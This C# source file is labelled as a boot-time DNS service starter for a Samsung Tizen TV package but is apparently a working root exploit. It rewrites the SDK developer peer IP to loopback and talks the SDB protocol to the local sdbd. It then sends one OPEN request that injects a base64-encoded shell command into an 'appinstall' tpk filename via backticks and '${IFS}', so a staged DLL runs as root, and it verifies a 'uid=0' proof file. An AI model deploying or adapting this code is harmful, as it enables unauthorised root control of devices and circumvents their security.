// On-boot starter for the TV-local DNS service (package dnsbootprb).
// Retries only the inert CNXN handshake, never OPEN.
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

public static class SdbHandshake {
    public sealed class Packet { public string Op; public uint A, B; }
    static byte[] Exact(NetworkStream s, int n, Stopwatch clock, int budgetMs) {
        byte[] data = new byte[n]; int pos = 0;
        while (pos < n) {
            int remaining = budgetMs - (int)clock.ElapsedMilliseconds;
            if (remaining <= 0) throw new TimeoutException("SDB packet deadline");
            s.ReadTimeout = remaining;
            int count = s.Read(data, pos, n - pos);
            if (count == 0) throw new IOException("SDB EOF");
            pos += count;
        }
        return data;
    }
    public static void Send(NetworkStream s, string op, uint a, uint b, string payload) {
        byte[] p = Encoding.UTF8.GetBytes(payload);
        uint command = BitConverter.ToUInt32(Encoding.ASCII.GetBytes(op), 0), sum = 0;
        foreach (byte value in p) sum += value;
        using (var m = new MemoryStream()) {
            var w = new BinaryWriter(m);
            foreach (uint value in new uint[] {command, a, b, (uint)p.Length, sum, command ^ 0xffffffff}) w.Write(value);
            w.Write(p); byte[] all = m.ToArray(); s.Write(all, 0, all.Length);
        }
    }
    public static Packet Receive(NetworkStream s, int budgetMs = 2000) {
        var clock = Stopwatch.StartNew();
        byte[] h = Exact(s, 24, clock, budgetMs);
        uint command = BitConverter.ToUInt32(h, 0), length = BitConverter.ToUInt32(h, 12);
        if (length > 65536 || BitConverter.ToUInt32(h, 20) != (command ^ 0xffffffff))
            throw new IOException("Invalid SDB header");
        byte[] p = Exact(s, (int)length, clock, budgetMs); uint sum = 0;
        foreach (byte value in p) sum += value;
        if (sum != BitConverter.ToUInt32(h, 16)) throw new IOException("Invalid SDB checksum");
        return new Packet {Op = Encoding.ASCII.GetString(h, 0, 4), A = BitConverter.ToUInt32(h, 4), B = BitConverter.ToUInt32(h, 8)};
    }
    public static TcpClient ConnectReady(IPAddress host, int port, int budgetMs, int attemptMs, int pauseMs, Action<string> log) {
        var clock = Stopwatch.StartNew(); int attempt = 0;
        while (clock.ElapsedMilliseconds < budgetMs) {
            TcpClient client = new TcpClient(host.AddressFamily);
            try {
                int remaining = budgetMs - (int)clock.ElapsedMilliseconds;
                if (remaining <= 0) throw new TimeoutException("Handshake deadline");
                int timeout = Math.Min(attemptMs, remaining);
                var pending = client.ConnectAsync(host, port);
                // Do not dispose an APM wait handle while its socket callback may
                // still be running. Closing client cancels a timed-out connection.
                pending.ContinueWith(t => { var observed = t.Exception; },
                    TaskContinuationOptions.OnlyOnFaulted | TaskContinuationOptions.ExecuteSynchronously);
                if (!pending.Wait(timeout)) throw new TimeoutException("TCP connect timeout");
                remaining = budgetMs - (int)clock.ElapsedMilliseconds;
                if (remaining <= 0) throw new TimeoutException("Handshake deadline");
                client.ReceiveTimeout = Math.Min(attemptMs, remaining);
                client.SendTimeout = Math.Min(attemptMs, remaining);
                var stream = client.GetStream();
                Send(stream, "CNXN", 0x1000000, 4096, "host::\0");
                int readBudget = Math.Min(attemptMs, budgetMs - (int)clock.ElapsedMilliseconds);
                if (readBudget <= 0) throw new TimeoutException("Handshake deadline");
                if (Receive(stream, readBudget).Op != "CNXN") throw new IOException("SDB handshake rejected");
                log("SDB handshake ready, attempt=" + (attempt + 1));
                return client;
            } catch (Exception e) {
                client.Close(); attempt++;
                log("pre-OPEN handshake attempt=" + attempt + " failed: " + e.GetType().Name);
                int wait = Math.Min(pauseMs, Math.Max(0, budgetMs - (int)clock.ElapsedMilliseconds));
                if (wait > 0) Thread.Sleep(wait);
            }
        }
        throw new TimeoutException("No valid SDB handshake within bounded readiness window");
    }
    // The caller may inspect a nonce-specific receipt after an error. It must not retry OPEN.
    public static void SubmitOnce(TcpClient client, string service) {
        client.ReceiveTimeout = 35000; client.SendTimeout = 5000;
        var stream = client.GetStream();
        var clock = Stopwatch.StartNew();
        Send(stream, "OPEN", 1, 0, service + "\0");
        for (int i = 0; i < 64; i++) {
            int remaining = 35000 - (int)clock.ElapsedMilliseconds;
            if (remaining <= 0) throw new TimeoutException("SDB acknowledgement deadline");
            var p = Receive(stream, remaining);
            if (p.B != 1) throw new IOException("Wrong SDB stream");
            if (p.Op == "CLSE") return;
            if (p.Op == "WRTE") Send(stream, "OKAY", 1, p.A, "");
            else if (p.Op != "OKAY") throw new IOException("Unexpected SDB opcode");
        }
        throw new IOException("SDB response budget exceeded");
    }
}

public static class RootReceipt {
    public static bool Valid(string p, string boot, string nonce) {
        return p.Contains("boot_id=" + boot + "\n") && p.Contains("request_id=" + nonce + "\n") &&
               p.Contains("uid=0(") && p.Contains("dns_ready=1\n") && p.Contains("payload done");
    }
}

public static class BoundedLog {
    public const long Limit = 65536;
    // Same single rotation as the supervisor's service.log: at most ~2 x Limit.
    public static void Append(string file, string line) {
        if (File.Exists(file) && new FileInfo(file).Length > Limit) {
            if (File.Exists(file + ".1")) File.Delete(file + ".1");
            File.Move(file, file + ".1");
        }
        File.AppendAllText(file, line + "\n");
    }
}

class DnsBootProbe {
    const string Version = "0.0.6";
    const string Job = "archive-root-d0cb000000000001";
    const string Sdk = "/home/owner/share/tmp/sdk_tools";
    const string Package = "/opt/usr/apps/dnsbootprb";
    const string Data = "/opt/usr/home/owner/apps_rw/dnsbootprb/data";
    [DllImport("libvconf.so.0")] static extern IntPtr vconf_get_str(string key);
    [DllImport("libvconf.so.0")] static extern int vconf_set_str(string key, string value);
    [DllImport("libc")] static extern void free(IntPtr p);
    static string ReadIP() {
        IntPtr p = vconf_get_str("db/sdk/develop/ip");
        if (p == IntPtr.Zero) throw new IOException("Cannot read SDK peer");
        try { return Marshal.PtrToStringAnsi(p); } finally { free(p); }
    }
    static void SetIP(string ip) {
        if (vconf_set_str("db/sdk/develop/ip", ip) != 0 || ReadIP() != ip)
            throw new IOException("SDK peer write/readback failed");
    }
    static string Q(string value) { return "'" + value.Replace("'", "'\\''") + "'"; }
    static void Log(string message) {
        string line = DateTime.UtcNow.ToString("o") + " " + message;
        try { Directory.CreateDirectory(Data); BoundedLog.Append(Data + "/probe.log", line); }
        catch (IOException) { } catch (UnauthorizedAccessException) { }
        Console.WriteLine(line);
    }
    // A run interrupted inside the watchdog window leaves its ACK file behind.
    // Called under run.lock before arming; a still-sleeping old watchdog does
    // not need its ACK file.
    static void RemoveStaleAcks() {
        foreach (string file in Directory.GetFiles(Data, "watchdog-*")) File.Delete(file);
    }
    static void ArmRecovery(string original, string nonce) {
        string ack = Data + "/watchdog-" + nonce;
        string body = "exec </dev/null >/dev/null 2>&1; printf %s " + Q(nonce) + " > " + Q(ack) +
            "; sleep 120; if vconftool get db/sdk/develop/ip | grep -F 'value = 127.0.0.1 (String)' >/dev/null; then " +
            "vconftool set -f -t string db/sdk/develop/ip " + Q(original) + "; fi; rm -f " + Q(ack);
        // Like the tested root runner: pass shell source through stdin, never
        // assume ProcessStartInfo.Arguments understands POSIX single quotes.
        Process watcher = Process.Start(new ProcessStartInfo("/usr/bin/setsid", "/bin/sh") {
            UseShellExecute = false, RedirectStandardInput = true
        });
        if (watcher == null) throw new IOException("No recovery process");
        try {
            watcher.StandardInput.WriteLine(body);
            watcher.StandardInput.Close();
            for (int i = 0; i < 20; i++) {
                if (File.Exists(ack) && File.ReadAllText(ack) == nonce) { Log("Recovery watchdog acknowledged (120s)"); return; }
                Thread.Sleep(100); // setsid may fork; the nonce ACK, not wrapper lifetime, is authoritative.
            }
            throw new IOException("Recovery watchdog did not acknowledge; peer unchanged");
        } finally { watcher.Dispose(); }
    }
    static void Stage(string nonce, string original) {
        string dir = Sdk + "/" + Job;
        if (Directory.Exists(dir)) Directory.Delete(dir, true);
        Directory.CreateDirectory(dir);
        Directory.CreateDirectory(Sdk + "/on-demand");
        foreach (string file in new string[] {"SamsungTvArchiveRoot.dll", "SamsungTvArchiveRoot.runtimeconfig.json", "public.pem", "passwd"})
            File.Copy(Package + "/bin/" + file, dir + "/" + file, true);
        foreach (string suffix in new string[] {".tar.gz", ".tar.gz.signature"})
            File.Copy(Package + "/bin/on-demand/" + Job + suffix, Sdk + "/on-demand/" + Job + suffix, true);
        File.WriteAllText(dir + "/request.id", nonce);
        File.WriteAllText(dir + "/original.peer", original);
    }
    static bool FreshProof(string boot, string nonce) {
        try {
            string p = File.ReadAllText("/opt/dnsboot/proof.txt");
            return RootReceipt.Valid(p, boot, nonce);
        } catch (IOException) { return false; }
    }
    static int Main() {
        string original = null; bool flipped = false;
        try {
            Directory.CreateDirectory(Data);
            if (!File.Exists("/opt/dnsboot/dns-enabled")) { Log("TV-local DNS disabled; skipping startup"); return 0; }
            using (var appLock = new FileStream(Data + "/run.lock", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None)) {
                string boot = File.ReadAllText("/proc/sys/kernel/random/boot_id").Trim();
                string marker = Data + "/boot-done", done = Version + ":" + boot;
                if (File.Exists(marker) && File.ReadAllText(marker).Trim() == done) { Log("Already complete for this version/boot"); return 0; }
                Log("Starting " + Version + ", pid=" + Process.GetCurrentProcess().Id);
                Thread.Sleep(8000); // Allow package installer's SDB connection to finish.
                string nonce = Guid.NewGuid().ToString("N");
                original = ReadIP(); IPAddress peer;
                if (!IPAddress.TryParse(original, out peer) || peer.AddressFamily != AddressFamily.InterNetwork ||
                    IPAddress.IsLoopback(peer) || peer.Equals(IPAddress.Any) || peer.Equals(IPAddress.Broadcast))
                    throw new IOException("Invalid/already-loopback original peer; refusing change");
                Stage(nonce, original);
                RemoveStaleAcks();
                ArmRecovery(original, nonce);
                flipped = true; SetIP("127.0.0.1");
                Thread.Sleep(500); // vconf readback does not prove sdbd's cache has refreshed.
                using (var client = SdbHandshake.ConnectReady(IPAddress.Loopback, 26101, 55000, 2000, 750, Log)) {
                    string command = "/usr/bin/dotnet " + Sdk + "/" + Job + "/SamsungTvArchiveRoot.dll " + Job + " >/dev/null 2>&1";
                    string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
                    string service = "shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk";
                    try { SdbHandshake.SubmitOnce(client, service); Log("Bootstrap acknowledged"); }
                    catch (Exception e) { Log("OPEN sent once; acknowledgement uncertain: " + e.GetType().Name + "; checking nonce receipt, NOT retrying"); }
                }
                var proofDeadline = Stopwatch.StartNew();
                while (!FreshProof(boot, nonce) && proofDeadline.ElapsedMilliseconds < 10000) Thread.Sleep(200);
                if (!FreshProof(boot, nonce)) throw new IOException("No completed root receipt for this exact request/boot");
                File.WriteAllText(marker, done);
                Log("Fresh nonce-specific root + DNS-ready receipt verified; boot complete");
                return 0;
            }
        } catch (Exception e) { Log("ERROR " + e); return 1; }
        finally {
            if (flipped && original != null) {
                try { SetIP(original); Log("Original SDK peer restored"); }
                catch (Exception e) { Log("RESTORE_FAILED; watchdog remains armed: " + e.GetType().Name); }
            }
        }
    }
}
